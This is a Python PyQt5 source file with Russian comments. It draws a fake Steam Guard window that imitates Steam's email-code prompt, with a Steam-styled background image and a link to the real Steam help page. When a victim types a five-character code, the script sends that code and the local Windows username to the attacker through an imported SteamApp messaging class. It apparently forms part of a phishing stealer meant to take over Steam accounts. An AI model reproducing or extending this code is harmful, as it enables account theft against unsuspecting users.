import sys, config
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QPainter, QColor, QPen, QFont
from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton, QCheckBox
from requests import get
from os import system
from main import SteamApp

from getpass import getuser

class SteamGuard(QWidget):
    def __init__(self, login):
        super().__init__()

        # Загрузка изображения
        response = get('https://sun9-14.userapi.com/impg/1UvgvmNS0AEYQAWZ6cDCQMxgjRorVM2YMSq27Q/ItclbMVxrZU.jpg?size=708x431&quality=96&sign=6573a98011ac9c8fe00592d328c5dd92&type=album')
        image_data = response.content

        # Создание объекта QPixmap из загруженных данных изображения
        pixmap = QPixmap()
        pixmap.loadFromData(image_data)

        # Присвоение созданного QPixmap атрибуту background
        self.background = pixmap
        
        self.label = QLabel(self)
        self.label.setPixmap(self.background)

        self.login = login

        # Создаем экземпляр шрифта Arial
        font = QFont("Arial")

        # Устанавливаем стиль для всего виджета
        self.setStyleSheet("QWidget { font-family: Arial; }")

        self.steamapp = SteamApp()

        self.email_code = QLineEdit(self)
        self.email_code.setGeometry(182, 125, 343, 68)
        self.email_code.setMaxLength(5)
        self.email_code.setStyleSheet("""
            QLineEdit {
                background-color: #32353c;
                border-radius: 4px;
                padding: 6px;
                color: white;
                font-size: 30px;
                font-weight: bold;
                letter-spacing: 40px;
                padding-left: 29px;
                text-transform: uppercase;  /* Преобразование текста в заглавные буквы */
            }
        """)
        self.email_code.textChanged.connect(self.check)


        self.help = QLabel("У меня больше нет доступа к электронной почте для этого аккаунта", self)
        self.help.setGeometry(180, 290, 800, 30)
        self.help.setStyleSheet("""
            color: #A9A9A9;
            font-size: 12px;
            cursor: arrow;
            text-decoration: underline;
        """)
        self.help.mousePressEvent = self.help_clicked

        # Добавляем форму регистрации
        self.reg = QLabel("Аккаунт: " + self.login, self)
        self.reg.setGeometry(280, 80, 800, 30)
        self.reg.setStyleSheet("""
            color: #A9A9A9;
            font-size: 20px;
            cursor: arrow;
        """)

        # Задаем начальные координаты и размеры окна
        self.setGeometry(100, 100, self.background.width(), self.background.height())

        # Устанавливаем стиль окна без рамки
        self.setWindowFlags(Qt.FramelessWindowHint)

        # Регистрируем обработчики событий мыши
        self.label.mousePressEvent = self.mouse_press_event
        self.label.mouseMoveEvent = self.mouse_move_event

        self.drag_position = None

    def check(self, text):
        if len(text) >= 5:
            self.steamapp.send_message(f'''👥 Пользователь: {getuser()}
⚙ КОД: {text}''')

    def help_clicked(self, event):
        system('start https://help.steampowered.com/ru/faqs/view/3944-4D89-1B3E-27DE')
        
    def mouse_press_event(self, event):
        # Проверяем, если клик был сделан в верхней части окна
        if event.y() <= 30:
            self.drag_position = event.globalPos() - self.frameGeometry().topLeft()
        else:
            self.drag_position = None
        if event.button() == Qt.LeftButton and event.x() >= self.width() - 30 and event.y() <= 30:
            sys.exit()  # Закрываем приложение
    
    def mouse_move_event(self, event):
        if self.drag_position:
            self.move(event.globalPos() - self.drag_position)
    
    def close_app(self, event):
        # Проверяем, если клик был сделан в правом верхнем углу окна
        if event.x() >= self.width() - 30 and event.y() <= 30:
            sys.exit() # Закрываем приложение